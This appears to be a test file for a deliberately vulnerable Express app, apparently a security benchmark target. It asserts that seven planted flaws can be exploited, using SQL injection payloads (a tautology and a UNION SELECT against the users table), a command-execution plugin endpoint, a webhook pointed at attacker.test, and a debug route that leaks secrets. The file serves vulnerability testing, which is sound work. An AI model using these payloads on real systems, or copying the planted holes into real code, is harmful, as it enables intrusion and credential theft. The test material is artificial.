/**
 * The seven adaptive surfaces.
 *
 * Each test asserts two things: that the surface is reachable over real HTTP,
 * and that it is actually vulnerable. A surface that exists but cannot be
 * exploited would prove nothing about the trigger that is supposed to find it.
 *
 * The conditional surfaces need a different environment from the rest of the
 * suite, so they build their own Express app with the right variables set
 * instead of reusing the shared one.
 */

import request from 'supertest';
import type { Express } from 'express';

import { createApp, registerDynamicRoutes } from '../src/app';
import { resetDatabase, loginAs, auth, pool } from './helpers';

/** Build an app under an explicit environment, then restore what was there. */
async function withEnv(
  vars: Record<string, string | undefined>,
  fn: (app: Express) => Promise<void>,
): Promise<void> {
  const saved: Record<string, string | undefined> = {};
  for (const [key, value] of Object.entries(vars)) {
    saved[key] = process.env[key];
    if (value === undefined) {
      delete process.env[key];
    } else {
      process.env[key] = value;
    }
  }
  try {
    const app = createApp();
    await registerDynamicRoutes(app);
    await fn(app);
  } finally {
    for (const [key, value] of Object.entries(saved)) {
      if (value === undefined) {
        delete process.env[key];
      } else {
        process.env[key] = value;
      }
    }
  }
}

beforeAll(async () => {
  await resetDatabase();
});

describe('VULN-033 dynamic_route_registration', () => {
  it('exposes the database-defined route inventory', async () => {
    await withEnv({}, async (app) => {
      const res = await request(app).get('/api/routes');
      expect(res.status).toBe(200);
      const paths = res.body.routes.map((r: { path: string }) => r.path);
      expect(paths).toContain('/legacy/reports');
      expect(paths).toContain('/legacy/ledger');
      // The stored SQL is disclosed too, which is how the second sink is found.
      const keys = res.body.stored_queries.map((q: { key: string }) => q.key);
      expect(keys).toContain('legacyReports');
    });
  });

  it('serves a route that no source file names', async () => {
    await withEnv({}, async (app) => {
      const res = await request(app).get('/legacy/reports');
      expect(res.status).toBe(200);
      expect(Array.isArray(res.body.rows)).toBe(true);
    });
  });

  it('is injectable through the filter parameter (VULN-037 second-order sink)', async () => {
    await withEnv({}, async (app) => {
      const res = await request(app).get('/legacy/ledger').query({
        // Tautology over the users table: every row, including admin, comes back.
        filter: "1=1 OR username='admin'",
      });
      expect(res.status).toBe(200);
      const usernames = res.body.rows.map((r: { username: string }) => r.username);
      expect(usernames).toContain('admin');
      expect(usernames.length).toBeGreaterThan(1);
    });
  });

  it('executes SQL text that was changed in the database, not in source', async () => {
    await withEnv({}, async (app) => {
      await pool.query(
        `UPDATE query_config SET sql = $1, updated_at = now() WHERE key = 'legacyReports'`,
        [`SELECT id, kind, amount, note, 'V2_STORED_CODE_MARKER' AS marker FROM transactions`],
      );
      try {
        const res = await request(app).get('/legacy/reports');
        expect(res.status).toBe(200);
        expect(res.body.rows.every((r: { marker: string }) => r.marker === 'V2_STORED_CODE_MARKER')).toBe(true);
      } finally {
        await pool.query(
          `UPDATE query_config SET sql = $1, updated_at = now() WHERE key = 'legacyReports'`,
          [`SELECT id, kind, amount, note FROM transactions`],
        );
      }
    });
  });
});

describe('VULN-039 plugin_system', () => {
  it('reports plugins picked up by the directory scan', async () => {
    await withEnv({}, async (app) => {
      const res = await request(app).get('/api/plugins');
      expect(res.status).toBe(200);
      const sources = res.body.loaded.map((p: { source: string }) => p.source);
      expect(sources).toContain('directory');
    });
  });

  it('exposes an endpoint that exists only because a file is in the plugin directory', async () => {
    await withEnv({}, async (app) => {
      const res = await request(app)
        .get('/api/plugins/audit')
        .query({ cmd: 'echo V2_PLUGIN_MARKER' });
      expect(res.status).toBe(200);
      expect(res.body.stdout).toContain('audit-start');
      expect(res.body.stdout).toContain('V2_PLUGIN_MARKER');
    });
  });
});

describe('VULN-034 dynamic_import', () => {
  it('loads the module named by PLUGIN_PATH and serves its route', async () => {
    const pluginPath = `${process.cwd()}/dist/plugins/envplugin.js`;
    await withEnv({ PLUGIN_PATH: pluginPath }, async (app) => {
      const inventory = await request(app).get('/api/plugins');
      const fromEnv = inventory.body.loaded.filter((p: { source: string }) => p.source === 'env');
      expect(fromEnv.length).toBeGreaterThan(0);

      const res = await request(app).get('/api/plugins/envinfo');
      expect(res.status).toBe(200);
      expect(res.body.loaded_via).toBe('PLUGIN_PATH');
      expect(res.body.stdout).toContain('envplugin-loaded');
    });
  });
});

describe('VULN-035 feature_flag', () => {
  it('does not expose the beta exporter when the flag is off', async () => {
    await withEnv({ FEATURE_BETA_EXPORT: undefined }, async (app) => {
      const res = await request(app).get('/api/beta/export');
      expect(res.status).toBe(404);
    });
  });

  it('exposes an injectable exporter when FEATURE_BETA_EXPORT=on', async () => {
    await withEnv({ FEATURE_BETA_EXPORT: 'on' }, async (app) => {
      const surfaces = await request(app).get('/api/surfaces');
      expect(surfaces.body.conditional.map((s: { name: string }) => s.name)).toContain('beta_export');

      const res = await request(app)
        .get('/api/beta/export')
        // The flag-gated route was never reviewed, so `account` is concatenated
        // straight into the statement. UNION across to the users table: the
        // columns are cast to text so the injected SELECT is valid SQL.
        .query({ account: `' UNION SELECT id, username, role, balance::text FROM users -- ` });
      expect(res.status).toBe(200);
      const authors = res.body.rows.map((r: { author?: string }) => r.author);
      expect(authors).toContain('admin');
      // The raw injected text comes back in the response, which is the visible
      // proof that it reached the query unparameterised.
      expect(res.body.account).toContain('UNION SELECT');
    });
  });
});

describe('VULN-036 webhook_discovery', () => {
  it('has no hook surface when WEBHOOK_ENABLED is unset', async () => {
    await withEnv({ WEBHOOK_ENABLED: undefined }, async (app) => {
      const res = await request(app).get('/api/hooks');
      expect(res.status).toBe(404);
    });
  });

  it('registers and lists subscriptions when WEBHOOK_ENABLED=true', async () => {
    await withEnv({ WEBHOOK_ENABLED: 'true' }, async (app) => {
      const register = await request(app)
        .post('/api/hooks/register')
        .send({ url: 'https://attacker.test/hook', event: 'transfer.completed' });
      expect(register.status).toBe(201);
      expect(register.body.subscription.url).toBe('https://attacker.test/hook');

      const list = await request(app).get('/api/hooks');
      expect(list.body.subscriptions.map((s: { url: string }) => s.url)).toContain(
        'https://attacker.test/hook',
      );
    });
  });

  it('accepts an unauthenticated, unverified delivery', async () => {
    await withEnv({ WEBHOOK_ENABLED: 'true' }, async (app) => {
      const res = await request(app)
        .post('/api/hooks/deliver')
        .send({ event: 'transfer.completed', actor: 'not-stripe' });
      expect(res.status).toBe(202);
      expect(res.body.accepted).toBe(true);

      const logged = await pool.query(
        `SELECT actor, action FROM audit_log WHERE action = 'webhook:transfer.completed' ORDER BY id DESC LIMIT 1`,
      );
      expect(logged.rows[0].actor).toBe('not-stripe');
    });
  });
});

describe('VULN-038 env_conditional', () => {
  it('does not expose /api/debug outside production', async () => {
    await withEnv({ NODE_ENV: 'test' }, async (app) => {
      const res = await request(app).get('/api/debug');
      expect(res.status).toBe(404);
    });
  });

  it('leaks the process environment when NODE_ENV=production', async () => {
    await withEnv({ NODE_ENV: 'production' }, async (app) => {
      const res = await request(app).get('/api/debug');
      expect(res.status).toBe(200);
      expect(res.body.node_env).toBe('production');
      // The signing secret is in there, which is the actual damage.
      expect(res.body.env.JWT_SECRET).toBeTruthy();
      expect(res.body.env.DATABASE_URL).toContain('postgresql://');
    });
  });
});

describe('authenticated routes still behave', () => {
  it('logs in and reads the profile', async () => {
    const token = await loginAs('alice');
    const res = await request(createApp()).get('/api/auth/me').set('Authorization', auth(token));
    expect(res.status).toBe(200);
    expect(res.body.username).toBe('alice');
  });
});
